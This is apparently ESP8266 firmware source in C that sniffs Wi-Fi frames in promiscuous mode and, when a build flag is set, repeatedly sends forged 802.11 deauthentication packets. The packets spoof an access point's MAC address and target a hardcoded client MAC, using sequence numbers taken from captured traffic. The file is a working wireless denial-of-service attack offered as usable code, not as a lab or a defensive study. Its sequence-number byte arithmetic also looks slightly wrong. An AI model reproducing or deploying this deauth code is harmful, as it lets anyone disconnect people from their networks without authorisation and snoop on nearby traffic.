/*
 * sniffer.c
 */


#include "sniffer.h"

#include "driver/uart.h"
#include "user_config.h"
#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "mem.h"
#include "user_interface.h"
#include "sniffer.h"

#if DEAUTH_ENABLE
static volatile os_timer_t deauth_timer;
#endif
#if HOP_JUMP_ENABLE
static volatile os_timer_t channelHop_timer;
#endif

// Channel to perform deauth
uint8_t channel = 1;

// Access point MAC to deauth
uint8_t ap[6] = {0x00,0x01,0x02,0x03,0x04,0x05};

// Client MAC to deauth
uint8_t client[6] = {0xc4, 0x6a, 0xb7, 0x9f, 0xcc, 0x34};

// Sequence number of a packet from AP to client
uint16_t seq_n = 0;

// Packet buffer
uint8_t packet_buffer[64];

uint8_t temp_mac[6] = {0xc4, 0x6a, 0xb7, 0x9f, 0xcc, 0x34};


#if HOP_JUMP_ENABLE
void ICACHE_FLASH_ATTR
channelHop(void *arg)
{
    // 1 - 13 channel hopping
    uint8 new_channel = wifi_get_channel() % 12 + 1;
    os_printf("** hop to %d **\t    Client MAC\t\t    AP MAC\r\n", new_channel);
    wifi_set_channel(new_channel);
}
#endif

#if DEAUTH_ENABLE
/* Creates a deauth packet.
 *
 * buf - reference to the data array to write packet to;
 * client - MAC address of the client;
 * ap - MAC address of the acces point;
 * seq - sequence number of 802.11 packet;
 *
 * Returns: size of the packet
 */
uint16_t ICACHE_FLASH_ATTR
deauth_packet(uint8_t *buf, uint8_t *client, uint8_t *ap, uint16_t seq)
{
    int i=0;

    // Type: deauth
    buf[0] = 0xC0;
    buf[1] = 0x00;
    // Duration 0 msec, will be re-written by ESP
    buf[2] = 0x00;
    buf[3] = 0x00;
    // Destination
    for (i=0; i<6; i++) buf[i+4] = client[i];
    // Sender
    for (i=0; i<6; i++) buf[i+10] = ap[i];
    for (i=0; i<6; i++) buf[i+16] = ap[i];
    // Seq_n
    buf[22] = seq % 0xFF;
    buf[23] = seq / 0xFF;
    // Deauth reason
    buf[24] = 1;
    buf[25] = 0;
    return 26;
}

/* Sends deauth packets. */
void ICACHE_FLASH_ATTR
deauth(void *arg)
{
    os_printf("\nSending deauth seq_n = %d ...\n", seq_n/0x10);
    // Sequence number is increased by 16, see 802.11
    uint16_t size = deauth_packet(packet_buffer, client, ap, seq_n+0x10);
    wifi_send_pkt_freedom(packet_buffer, size, 0);
}
#endif

/* Listens communication between AP and client */
static void ICACHE_FLASH_ATTR
promisc_cb(uint8_t *buf, uint16_t len)
{
    if (len == 12){
        struct RxControl *sniffer = (struct RxControl*) buf;
    } else if (len == 128) {
        struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
    } else {
        struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
        int i=0;
        // Check MACs

        // 如果MAC地址和上一次一样就返回
		if(0==os_memcmp(temp_mac, &sniffer->buf[4], 6)){
			return;
		}

		// 缓存上次的MAC，避免重复打印
		for (i=0; i<6; i++){
			temp_mac[i] = sniffer->buf[i+4];
		}

		#if SNIFFER_TEST
			os_printf("-> %3d: %d", wifi_get_channel(), len);
			printmac(sniffer->buf, 4);
			printmac(sniffer->buf, 10);
			os_printf("\n");
		#endif

		// 判断client
        for (i=0; i<6; i++) if (sniffer->buf[i+4] != client[i]) return;
        printmac(sniffer->buf, 4);

        os_printf("\r\n");
        os_printf("\trssi:%d\r\n", sniffer->rx_ctrl.rssi);
        os_printf("\tchannel:%d\r\n", sniffer->rx_ctrl.channel);
        os_printf("\trate:%d\r\n", sniffer->rx_ctrl.rate);
        os_printf("\tsig_mode:%d\r\n",sniffer->rx_ctrl.sig_mode);

        // 判断AP
        //for (i=0; i<6; i++) if (sniffer->buf[i+10] != ap[i]) return;
        //printmac(sniffer->buf, 10);

        //os_timer_disarm(&channelHop_timer);
        // Update sequence number
#if DEAUTH_ENABLE
        seq_n = sniffer->buf[23] * 0xFF + sniffer->buf[22];
#endif
    }
}


void ICACHE_FLASH_ATTR
sniffer_init(void)
{
    // Promiscuous works only with station mode
    wifi_set_opmode(STATION_MODE);
#if DEAUTH_ENABLE
    // Set timer for deauth
    os_timer_disarm(&deauth_timer);
    os_timer_setfn(&deauth_timer, (os_timer_func_t *) deauth, NULL);
    os_timer_arm(&deauth_timer, CHANNEL_HOP_INTERVAL, 1);
#endif

#if HOP_JUMP_ENABLE
    os_timer_disarm(&channelHop_timer);
    os_timer_setfn(&channelHop_timer, (os_timer_func_t *) channelHop, NULL);
    os_timer_arm(&channelHop_timer, CHANNEL_HOP_INTERVAL, 1);
#endif
}

void ICACHE_FLASH_ATTR
sniffer_init_in_system_init_done(void)
{
    // Set up promiscuous callback
    wifi_set_channel(1);
    wifi_promiscuous_enable(0);
    //u8 mac[6] = {0xc4, 0x6a, 0xb7, 0x9f, 0xcc, 0x34};
    //wifi_promiscuous_set_mac(mac);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
}

